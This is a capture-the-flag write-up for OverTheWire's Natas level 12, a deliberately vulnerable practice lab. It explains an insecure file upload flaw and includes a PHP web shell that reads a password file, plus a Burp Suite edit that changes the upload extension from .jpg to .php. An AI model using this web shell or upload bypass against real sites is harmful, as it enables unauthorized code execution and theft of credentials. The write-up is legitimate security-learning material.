# Natas Level 12 → Level 13

### Description: 
Achieve **Remote Code Execution (RCE)** by bypassing client-side restrictions and exploiting an **Insecure File Upload** vulnerability..

### 1. Vulnerability Analysis

The source code revealed that the server generates a random filename but takes the file extension directly from a hidden POST parameter filename.

```PHP
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```
The application does not verify the actual file content or type, only the extension provided in the filename field. This allows an attacker to upload a PHP script instead of an image.

### 2. Exploit Preparation

I created a simple PHP web shell to read the password for the next level:

File: hack.php

```PHP
<?php
    echo passthru('cat /etc/natas_webpass/natas13');
?>
```

### 3. Execution (Intercept & Modify)

To bypass the front-end restriction that defaults to .jpg, I used Burp Suite:

Started the upload of hack.php.

Intercepted the request in Burp Suite Proxy/Repeater.

Located the filename parameter and changed the extension from .jpg to .php:

Before: filename=nx7ur8jw4l.jpg

After: filename=nx7ur8jw4l.php

Sent the modified request.

### 4. Result

The server successfully saved the file as a PHP script. By navigating to the provided link:
http://natas12.natas.labs.overthewire.org/upload/nx7ur8jw4l.php

The server executed the PHP code and displayed the password for Natas 13.
